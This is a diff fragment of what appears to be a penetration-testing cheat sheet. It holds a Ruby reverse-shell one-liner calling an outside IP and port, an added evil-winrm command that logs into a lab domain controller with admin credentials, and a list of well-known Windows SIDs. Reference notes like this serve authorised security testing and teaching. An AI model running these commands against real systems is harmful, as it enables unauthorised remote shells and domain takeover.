@@ -66,6 +66,11 @@ ruby -rsocket -e 'c=TCPSocket.new("123.123.123.1","4444");while(cmd=c.gets);IO.p
 
 ----
 
+#Alternative for PsRemote is to use evil-winrm
+evil-winrm -i dc.testad.local -u mega-admin -p adminpass
+
+----
+
 #Well-known-SIDs:
 S-1-0-0                       Nobody        
 S-1-1-0	                      Everybody
